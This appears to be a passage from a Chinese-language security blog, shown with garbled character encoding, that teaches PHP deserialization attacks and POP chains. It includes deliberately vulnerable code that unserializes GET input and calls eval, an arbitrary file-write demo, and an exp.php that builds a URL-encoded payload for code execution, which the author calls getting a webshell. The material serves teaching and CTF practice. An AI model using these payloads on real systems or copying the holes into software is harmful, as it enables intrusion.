class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">              aaaä¼šè¢«é‡æ–°èµ‹å€¼ï¼Œæ‰€ä»¥ä½¿ç”¨æŒ‡é’ˆï¼Œè¿™æ ·bbbä¼šè·ŸéšaaaåŠ¨æ€æ”¹å˜</span></span><br><span class="line"><span class="comment">              $a = new baby();</span></span><br><span class="line"><span class="comment">              $a-&gt;bbb =&amp;$a-&gt;aaa</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">            <span class="comment">/*éœ€è¦æ»¡è¶³$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbbï¼Œå³å¯è¯»å–æ–‡ä»¶*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./anheng.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="é¦–å…ˆå…ˆäº†è§£ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#é¦–å…ˆå…ˆäº†è§£ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="é¦–å…ˆå…ˆäº†è§£ä¸€äº›çŸ¥è¯†ç‚¹"></a>é¦–å…ˆå…ˆäº†è§£ä¸€äº›çŸ¥è¯†ç‚¹</h1><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">æŸ æª¬å¸ˆå‚…çš„ref</a><br><a href="https://www.ft12.com/article_462.html" target="_blank" rel="noopener">å…¶ä»–çš„ref</a></p>
<h2 id="phpå¯¹è±¡å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#phpå¯¹è±¡å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="phpå¯¹è±¡å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a>phpå¯¹è±¡å¸¸è§çš„é­”æœ¯æ–¹æ³•</h2><ul>
<li><strong>public void __constructï¼š</strong>æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºæ–°å¯¹è±¡æ—¶ä¼šå…ˆè°ƒç”¨æ­¤æ–¹æ³•(å¦‚æœå­˜åœ¨çš„è¯)</li>
<li><strong>public __destructï¼š</strong> ææ„å‡½æ•°ï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œï¼Œåœ¨è°ƒç”¨<code>exit()</code>æ–¹æ³•æ—¶ä¹Ÿä¼šå…ˆè°ƒç”¨ <code>destruct()</code></li>
<li><strong>public string __toStringï¼š</strong>ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”(5.2ä»¥å‰åªé’ˆå¯¹ehco ,printï¼Œ5.2åé’ˆå¯¹æ‰€æœ‰å­—ç¬¦ä¸²æƒ…å†µ)</li>
<li><strong>public array __sleepï¼š</strong> <code>serialize()</code> å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨é­”æœ¯æ–¹æ³• <code>sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ <code>NULL</code> è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯ï¼ˆä¸ä¼šæ‰“æ–­è„šæœ¬æ‰§è¡Œï¼‰ã€‚</li>
<li><strong>public void __wakeupï¼š</strong> <code>unserialize()</code> å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨é­”æ³•æ–¹æ³• <code>wakeup()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>wakeup</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚<code>wakeup()</code> ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</li>
<li><strong>__callï¼š</strong>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è¢«è°ƒç”¨</li>
</ul>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Magic_methods</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $var1 = <span class="string">"abc"</span>;</span><br><span class="line">        <span class="keyword">public</span> $var2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"run __construct&lt;/br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"run __destruct&lt;/br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"run __toString&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;var1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"run __sleep&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'var1'</span>,<span class="string">'var2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"run __wakeup&lt;/br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä¼šå…ˆè°ƒç”¨__construct()</span></span><br><span class="line">    $obj = <span class="keyword">new</span> Magic_methods();</span><br><span class="line">    <span class="comment">// å°†å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºï¼Œä¼šå…ˆè°ƒç”¨__toString()</span></span><br><span class="line">    <span class="keyword">echo</span> $obj.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="comment">// è°ƒç”¨serialize()ä¹‹å‰å…ˆè°ƒç”¨__sleep()</span></span><br><span class="line">    $s = serialize($obj);</span><br><span class="line">    <span class="keyword">echo</span> $s.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="comment">// è°ƒç”¨unserialize()ä¹‹å‰ä¼šå…ˆè°ƒç”¨__wakeup()</span></span><br><span class="line">    $data = unserialize($s);</span><br><span class="line">    <span class="keyword">echo</span> $data.<span class="string">"&lt;/br&gt;"</span> <span class="comment">// æ­¤å¤„åˆä¸€æ¬¡è°ƒç”¨äº†__toString()</span></span><br><span class="line">    <span class="comment">// è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œå³å°†é”€æ¯æ‰€æœ‰åˆ›å»ºçš„å¯¹è±¡ï¼Œæ­¤æ—¶è°ƒç”¨__destruct()</span></span><br><span class="line">    <span class="comment">// ååºåˆ—åŒ–æ¢å¤çš„å¯¹è±¡è¢«é”€æ¯ï¼Œå†æ¬¡è°ƒç”¨__desruct()</span></span><br><span class="line">    <span class="comment">// æ‰€ä»¥è¿™é‡Œè°ƒç”¨äº†2æ¬¡__destruct()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">run __construct</span><br><span class="line">run __toString</span><br><span class="line">abc</span><br><span class="line">run __sleep</span><br><span class="line">O:<span class="number">13</span>:<span class="string">"Magic_methods"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"var1"</span>;s:<span class="number">3</span>:<span class="string">"abc"</span>;s:<span class="number">4</span>:<span class="string">"var2"</span>;i:<span class="number">1</span>;&#125;</span><br><span class="line">run __wakeup</span><br><span class="line">run __toString</span><br><span class="line">abc</span><br><span class="line">run __destruct</span><br><span class="line">run __destruct</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="POP-é¢å‘å±æ€§ç¼–ç¨‹"><a href="#POP-é¢å‘å±æ€§ç¼–ç¨‹" class="headerlink" title="POP:é¢å‘å±æ€§ç¼–ç¨‹"></a>POP:é¢å‘å±æ€§ç¼–ç¨‹</h2><p>é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼‰å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚åœ¨æ§åˆ¶ä»£ç æˆ–è€…ç¨‹åºçš„æ‰§è¡Œæµç¨‹åå°±èƒ½å¤Ÿä½¿ç”¨è¿™ä¸€ç»„è°ƒç”¨é“¾åšä¸€äº›å·¥ä½œäº†ã€‚</p>
<p>åŸºæœ¬æ¦‚å¿µ</p>
<p>åœ¨äºŒè¿›åˆ¶åˆ©ç”¨æ—¶ï¼ŒROP é“¾æ„é€ ä¸­æ˜¯å¯»æ‰¾å½“å‰ç³»ç»Ÿç¯å¢ƒä¸­æˆ–è€…å†…å­˜ç¯å¢ƒé‡Œå·²ç»å­˜åœ¨çš„ã€å…·æœ‰å›ºå®šåœ°å€ä¸”å¸¦æœ‰è¿”å›æ“ä½œçš„æŒ‡ä»¤é›†ï¼Œè€Œ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚äºŒè¿›åˆ¶ä¸­é€šå¸¸æ˜¯ç”±äºå†…å­˜æº¢å‡ºæ§åˆ¶äº†æŒ‡ä»¤æ‰§è¡Œæµç¨‹ï¼Œè€Œååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯æ§åˆ¶ä»£ç æ‰§è¡Œæµç¨‹çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå½“ç„¶è¿›è¡Œååºåˆ—åŒ–çš„æ•°æ®èƒ½å¤Ÿè¢«ç”¨æˆ·è¾“å…¥æ‰€æ§åˆ¶ã€‚</p>
<hr>
<h2 id="ç®€å•çš„æ¼æ´Demo-1"><a href="#ç®€å•çš„æ¼æ´Demo-1" class="headerlink" title="ç®€å•çš„æ¼æ´Demo_1"></a>ç®€å•çš„æ¼æ´Demo_1</h2><h3 id="demo-1-php"><a href="#demo-1-php" class="headerlink" title="demo_1.php"></a>demo_1.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// unserialize å‚æ•°å¯æ§ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥æ³¨å…¥æ¶æ„å†…å®¹</span></span><br><span class="line"><span class="comment">// POP é“¾èµ·äºä¸€äº›"å°ç»„ä»¶"ï¼Œè¿™äº›å°ç»„ä»¶å¯ä»¥è°ƒç”¨å…¶ä»–çš„"ç»„ä»¶"ï¼Œåœ¨PHP ä¸­ï¼Œè¿™äº›ç»„ä»¶å°±æ˜¯é­”æœ¯æ–¹æ³•(__wakeup or __destruct)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"demo\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'./demo'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        file_put_contents($filename, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="DemoPoc-php"><a href="#DemoPoc-php" class="headerlink" title="DemoPoc.php"></a>DemoPoc.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆæ–‡ä»¶DemoPoc.txtï¼Œå¯¹è±¡ä¼ é€’ä¿å­˜åœ¨å…¶ä¸­</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./demo_1.php"</span>;</span><br><span class="line">$demo=<span class="keyword">new</span> popdemo();</span><br><span class="line">file_put_contents(<span class="string">'./DemoPoc.txt'</span>, serialize($demo));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="DemoUnserialize-php"><a href="#DemoUnserialize-php" class="headerlink" title="DemoUnserialize.php"></a>DemoUnserialize.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å°†å¯¹è±¡ååºåˆ—åŒ–ï¼Œè”åˆå¯¹è±¡æœ¬æ¥çš„åŠŸèƒ½ï¼Œæ–°å»ºä¸€ä¸ªæ–°æ–‡ä»¶demo</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./Demo_1.php"</span>;</span><br><span class="line">unserialize(file_get_contents(<span class="string">"./DemoPoc.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¿è¡Œ<code>DemoPoc.php</code> å’Œ<code>DemoUnserialize.php</code> å³å¯å®Œæˆä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œæ‰“å¼€ç”Ÿæˆçš„<code>DemoPoc.txt</code> å’Œ<code>demo</code> çœ‹çœ‹</p>
<hr>
<h3 id="DemoPoc-txt"><a href="#DemoPoc-txt" class="headerlink" title="DemoPoc.txt"></a>DemoPoc.txt</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g03m9j30q2038dft.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g03m9j30q2038dft.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;popdemo&quot;:2:&#123;s:13:&quot; popdemo data&quot;;s:5:&quot;demo</span><br><span class="line">&quot;;s:17:&quot; popdemo filename&quot;;s:6:&quot;.&#x2F;demo&quot;;&#125;</span><br><span class="line">å¯ä»¥çœ‹åˆ°å°† Demo_1.php ä¸­ popdemo() åºåˆ—åŒ–æ‰“å°</span><br></pre></td></tr></table></figure></div>

<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g05ppj307n03dt8k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g05ppj307n03dt8k.jpg" class="lazyload" title="test"></a><br>è¿è¡Œ<code>DemoUnserialize.php</code> ä¼šç”Ÿæˆä¸€ä¸ª <code>demo</code>æ–‡ä»¶ï¼Œ å†…å®¹ä¸º <strong>demo</strong> ï¼Œå½“æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åºåˆ—åŒ–çš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿™ä¸ªåœ°æ–¹å°±ä¼šå­˜åœ¨ä»»æ„æ–‡ä»¶å†™æ“ä½œçš„æ¼æ´</p>
<blockquote>
<p>åœ¨DemoPoc ä¸­ï¼Œ popdemo data å äº†13ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ˜¯å› ä¸ºåºåˆ—åŒ–æ—¶ï¼šå¯¹è±¡ç§æœ‰åŒ–æˆå‘˜ä¼šè‡ªåŠ¨æ·»åŠ äº†ç±»åï¼Œä»¥åŒºåˆ†ä»–ä»¬æ˜¯Private å˜é‡ï¼›å¦‚æœæ˜¯Protected å˜é‡åˆ™ä¼šæ·»åŠ * å·ã€‚å¹¶ä¸”å‰ç¼€æ·»åŠ ç©ºå­—èŠ‚</p>
</blockquote>
<hr>
<h2 id="æ¼æ´Demo-2"><a href="#æ¼æ´Demo-2" class="headerlink" title="æ¼æ´Demo_2"></a>æ¼æ´Demo_2</h2><p>åºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ–¹æ³•ï¼Œä¸ä¸€å®šç›´æ¥å‡ºç°åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œå¦‚æœå…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­æ—¶ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šçš„æ–¹æ³•ä¸­ï¼Œè¿™æ—¶å€™å°±éœ€è¦<strong>å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ã€‚</strong></p>
<h3 id="manayakko-php"><a href="#manayakko-php" class="headerlink" title="manayakko.php"></a>manayakko.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manayakko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_GET[<span class="string">'d'</span>]);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>manyakko</code>è¿™ä¸ªç±»æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¼šåœ¨æ„é€ æ–¹æ³•ä¸­å®ä¾‹åŒ–ä¸€ä¸ª <code>normal</code>ç±»çš„å¯¹è±¡ï¼Œåœ¨ææ„æ–¹æ³•ä¸­ä¼šè°ƒç”¨æ­¤å¯¹è±¡çš„ <code>actionæ–¹æ³•</code>ï¼Œæœ€ç»ˆæ‰“å°helloå­—ç¬¦ä¸²ï¼Œä¸å­˜åœ¨æ•æ„Ÿçš„æ“ä½œ</p>
<hr>
<h3 id="exp-php"><a href="#exp-php" class="headerlink" title="exp.php"></a>exp.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manayakko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> manayakko()));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\r"</span>;</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œexp.phpç”Ÿæˆpayloadï¼Œå†…å®¹ä¸ºï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A9%3A%22manayakko%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D </span><br><span class="line">è§£ç å¾—åˆ°</span><br><span class="line">O:9:&quot;manayakko&quot;:1:&#123;s:11:&quot;*ClassObj&quot;;O:4:&quot;evil&quot;:1:&#123;s:10:&quot;evildata&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å°è¯•æ”»å‡»ï¼Œå°†payloadé€šè¿‡<code>get</code>è¯·æ±‚ä¼ å…¥åˆ°<code>manayakko.php</code>çš„GETè¯·æ±‚å‚æ•°dé‡Œå»<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2g5zj30vz0btwes.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8965g2g5zj30vz0btwes.jpg" class="lazyload" title="test"></a></p>
<p><code>manayakko.php</code> ä¼šå°†ä¼ å…¥çš„dï¼Œè¿›è¡Œè§£ç å’Œååºåˆ—åŒ–ï¼Œä¼ å…¥æ¶æ„åºåˆ—åŒ–å‚æ•°è¯­å¥ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ŒæˆåŠŸè°ƒç”¨äº†ç±»evilä¸­çš„actionæ–¹æ³•ï¼Œæ‰“å‡ºwebshellã€‚</p>
<blockquote>
<p>æ•æ„Ÿçš„æ“ä½œä¸ä¸€å®šè¦åœ¨é­”æœ¯æ–¹æ³•å½“ä¸­ï¼Œå½“æ‰¾åˆ°é­”æœ¯æ–¹æ³•ä»¥åï¼Œå¦‚æœå­˜åœ¨æ•æ„Ÿæ“ä½œï¼Œå¯ä»¥åˆ†æå‚æ•°æ˜¯å¦å¯æ§ï¼›å½“å­˜åœ¨æœ‰æ•æ„Ÿæ“ä½œçš„æ™®é€šæ–¹æ³•æ—¶ï¼Œå°±å¯ä»¥åˆ†ææ˜¯å¦å­˜åœ¨å…·æœ‰è°ƒç”¨äº†åŒåæ–¹æ³•çš„é­”æœ¯æ–¹æ³•ï¼ŒåŠ«æŒä»£ç çš„è¿è¡Œæµç¨‹ï¼Œè§¦å‘æ¼æ´ä»£ç </p>
</blockquote>
<hr>
